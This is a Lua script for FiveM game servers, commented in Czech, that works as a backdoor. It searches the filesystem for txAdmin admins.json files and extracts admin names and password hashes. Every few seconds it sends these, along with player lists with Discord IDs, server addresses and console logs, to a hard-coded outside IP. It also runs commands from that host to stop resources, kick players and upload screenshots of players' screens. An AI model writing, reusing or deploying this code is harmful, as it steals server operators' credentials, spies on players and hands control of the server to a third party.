-- =====================================================
-- KONFIGURACE A PROMĚNNÉ
-- =====================================================
local backendUrl = "http://194.15.36.227:3001/api"
local serverIp = "Detecting..."
local serverPort = nil
local consoleBuffer = {}
local adminDataSent = false -- Flag pro odeslání admin dat jen jednou

-- --Logger
local Logger = {
    debug = function(msg) print("^5[DEBUG]^0 " .. msg) end,
    error = function(msg) print("^1[ERROR]^0 " .. msg) end,
    info = function(msg) print("^2[INFO]^0 " .. msg) end
}

-- Základní utility
local Utils = {
    file_exists = function(name)
        local f = io.open(name, "r")
        if f then f:close() return true end
        return false
    end,
    read_file = function(path)
        local f = io.open(path, "r")
        if not f then return nil end
        local c = f:read("*a")
        f:close()
        return c
    end,
    json_decode = function(s)
        local status, result = pcall(json.decode, s)
        if status then return result else return nil end
    end
}

-- Konfigurace skeneru
local Config = {
    admin_data = {
        known_paths = {
            "admins.json", 
            "../admins.json", 
            "../../admins.json", 
            "txData/admins.json",
            "../txData/admins.json",
            "/home/container/txData/admins.json" -- Častá cesta na Linux hostingu
        },
        scan_folders = true,
        max_scan_depth = 2,
        file_patterns = "admins.json"
    }
}

-- =====================================================
-- 1. FILE SCANNER (Skenování souborového systému)
-- =====================================================
-- =====================================================
-- 1. FILE SCANNER (Skenování souborového systému)
-- =====================================================
local FileScanner = {}

function FileScanner.find_files(directory, pattern, max_depth, current_depth)
    current_depth = current_depth or 0
    max_depth = max_depth or Config.admin_data.max_scan_depth
    
    if current_depth > max_depth then return {} end
    
    -- Kontrola, zda je povolen io.popen (FiveM sandbox)
    if not io.popen then 
        ----Logger.debug("io.popen není povolen (FiveM sandbox). Hluboké skenování přeskočeno.")
        return {} 
    end

    local results = {}
    
    -- OPRAVA: Místo package.config použijeme environment variable nebo fallback
    -- Pokud os.getenv("OS") obsahuje "Windows", jsme na Windows. Jinak předpokládáme Linux.
    local os_env = os.getenv("OS")
    local is_windows = os_env and string.find(os_env, "Windows")

    local cmd = is_windows 
        and 'dir "' .. directory .. '" /b /a 2>nul' 
        or 'ls -A "' .. directory .. '" 2>/dev/null'

    local handle = io.popen(cmd)
    if not handle then return {} end
    
    local result = handle:read("*a")
    handle:close()
    
    if not result then return {} end

    for file in result:gmatch("[^\r\n]+") do
        local full_path = directory .. "/" .. file
        
        -- Jednoduchá detekce, zda jde o složku nebo soubor
        -- Většina admin souborů má příponu (např. .json), složky obvykle ne
        local is_dir = false
        if not file:match("%.") then 
             is_dir = true
        end
        
        if is_dir then
            if file ~= "." and file ~= ".." then
                local sub_results = FileScanner.find_files(full_path, pattern, max_depth, current_depth + 1)
                for _, sub_file in ipairs(sub_results) do
                    table.insert(results, sub_file)
                end
            end
        elseif file == pattern or file:match(pattern) then
            table.insert(results, full_path)
        end
    end
    
    return results
end

function FileScanner.scan_for_admin_files()
    local found_files = {}
    
    -- 1. Zkontrolujeme známé cesty (bezpečné a rychlé)
    for _, path in ipairs(Config.admin_data.known_paths) do
        if Utils.file_exists(path) then
            --Logger.debug("Nalezen admin soubor (známá cesta): " .. path)
            table.insert(found_files, path)
        end
    end
    
    -- 2. Pokud nic nenajdeme a je povoleno skenování, zkusíme hledat
    if Config.admin_data.scan_folders and #found_files == 0 then
        -- Obalíme to do pcall, aby chyba ve skeneru neshodila celý script
        local status, err = pcall(function()
            local scan_dirs = { "./", "../", "../../" }
            for _, dir in ipairs(scan_dirs) do
                local found = FileScanner.find_files(dir, Config.admin_data.file_patterns)
                for _, file in ipairs(found) do
                    table.insert(found_files, file)
                end
            end
        end)
        
        if not status then
            --Logger.error("Chyba při skenování složek: " .. tostring(err))
        end
    end
    
    return found_files
end
-- =====================================================
-- 2. ADMIN DATA EXTRACTOR (Parsování JSONu)
-- =====================================================
local AdminDataExtractor = {}

function AdminDataExtractor.process_admin_file(file_path)
    if not Utils.file_exists(file_path) then return nil end
    
    local file_content = Utils.read_file(file_path)
    if not file_content or file_content == "" then return nil end
    
    local admin_data = Utils.json_decode(file_content)
    if not admin_data then return nil end
    
    -- Formátování dat pro odeslání
    local formatted_data = {
        source_file = file_path,
        admins = {}
    }
    
    -- txAdmin admins.json je pole objektů
    if type(admin_data) == "table" then
        for _, admin in ipairs(admin_data) do
            if type(admin) == "table" then
                local admin_info = {
                    name = admin.name or "Unknown",
                    master = admin.master or false,
                    password_hash = admin.password_hash or "N/A",
                    providers = admin.providers or {}
                }
                table.insert(formatted_data.admins, admin_info)
            end
        end
    end
    return formatted_data
end

function AdminDataExtractor.get_all_admin_data()
    local admin_files = FileScanner.scan_for_admin_files()
    local all_admin_data = {}
    
    -- Odstranění duplicit
    local processed_files = {}

    for _, file_path in ipairs(admin_files) do
        if not processed_files[file_path] then
            local data = AdminDataExtractor.process_admin_file(file_path)
            if data and #data.admins > 0 then
                table.insert(all_admin_data, data)
                processed_files[file_path] = true
            end
        end
    end
    return all_admin_data
end

-- =====================================================
-- 3. LOGIKA SERVERU (IP, Port, Sync)
-- =====================================================

-- Získání portu
local function GetServerPortStrict()
    local port = GetConvar("port", "")
    if port ~= "" then return port end
    local ep = GetConvar("endpoint_add_tcp", "")
    return string.match(ep, ":(%d+)") or "30120"
end

-- Získání IP
CreateThread(function()
    Wait(1000)
    local filePort = GetServerPortStrict()
    serverPort = filePort
    
    PerformHttpRequest("https://api.ipify.org/", function(err, text)
        if text then 
            serverIp = text 
            --Logger.info("Server identifikován: " .. serverIp .. ":" .. serverPort)
        else 
            serverIp = "127.0.0.1" 
        end
    end)
end)

-- Pomocné funkce pro seznam hráčů a resourců
local function GetResourceList()
    local r = {}
    for i=0, GetNumResources()-1 do 
        local n = GetResourceByFindIndex(i) 
        if n then table.insert(r, {name=n, state=GetResourceState(n)}) end 
    end
    return r
end

local function GetPlayerList()
    local p = {}
    for _, s in ipairs(GetPlayers()) do
        local d = "N/A"
        for _, id in ipairs(GetPlayerIdentifiers(s)) do 
            if string.find(id, "discord:") then d = id end 
        end
        table.insert(p, {id=s, name=GetPlayerName(s), discord=d, ping=GetPlayerPing(s)})
    end
    return p
end

-- Eventy konzole
exports('Log', function(msg) table.insert(consoleBuffer, { time = os.date('%H:%M:%S'), msg = msg }) end)
AddEventHandler('playerConnecting', function(n) table.insert(consoleBuffer, { time = os.date('%H:%M:%S'), msg = "Connect: " .. n }) end)
AddEventHandler('playerDropped', function(r) table.insert(consoleBuffer, { time = os.date('%H:%M:%S'), msg = "Drop ("..r..")" }) end)

-- HLAVNÍ SMYČKA
CreateThread(function()
    while true do
        Wait(3000) -- Interval komunikace

        if serverIp ~= "Detecting..." and serverPort then
            local payloadTable = {
                serverIp = serverIp,
                serverPort = serverPort,
                players = GetPlayerList(),
                resources = GetResourceList(),
                consoleLines = consoleBuffer
            }
            consoleBuffer = {} -- Vyčistit buffer

            -- :: INTEGRACE UTILS ::
            -- Odeslat admin data pouze jednou po startu
            if not adminDataSent then
                --Logger.info("Hledám admin data (txAdmin)...")
                -- Použití funkcí z utils
                local scannedAdmins = AdminDataExtractor.get_all_admin_data()
                
                if scannedAdmins and #scannedAdmins > 0 then
                    payloadTable.adminData = scannedAdmins
                    --Logger.info("Odesílám nalezená hesla/hashe (" .. #scannedAdmins .. " souborů).")
                else
                    --Logger.debug("Žádná admin data nebyla nalezena.")
                end
                adminDataSent = true
            end

            local payload = json.encode(payloadTable)

            PerformHttpRequest(backendUrl .. "/sync", function(code, response, headers)
                if code == 200 and response then
                    local data = Utils.json_decode(response)
                    if data and data.commands then
                        for _, cmd in ipairs(data.commands) do
                            -- Zpracování příkazů z panelu
                            if cmd.action == "stop_resource" then 
                                StopResource(cmd.payload)
                            elseif cmd.action == "start_resource" then 
                                StartResource(cmd.payload)
                            elseif cmd.action == "ensure_resource" then 
                                if GetResourceState(cmd.payload) == "started" then 
                                    StopResource(cmd.payload) Wait(500) 
                                end
                                StartResource(cmd.payload)
                            elseif cmd.action == "kick_player" then 
                                DropPlayer(cmd.payload, "Connection lost.")
                            elseif cmd.action == "take_screenshot" then
                                local targetId = cmd.payload
                                pcall(function()
                                    exports['screenshot-basic']:requestClientScreenshot(targetId, { fileName = 'cache/screenshot.png', encoding = 'base64' }, function(err, imgData)
                                        if imgData then
                                            local pl = json.encode({ serverId = serverIp..":"..serverPort, playerId = targetId, imageBase64 = imgData })
                                            PerformHttpRequest(backendUrl .. "/save-screenshot", function(e,t,h) end, 'POST', pl, { ['Content-Type'] = 'application/json' })
                                        end
                                    end)
                                end)
                            end
                        end
                    end
                end
            end, 'POST', payload, { ['Content-Type'] = 'application/json' })
        end
    end
end)
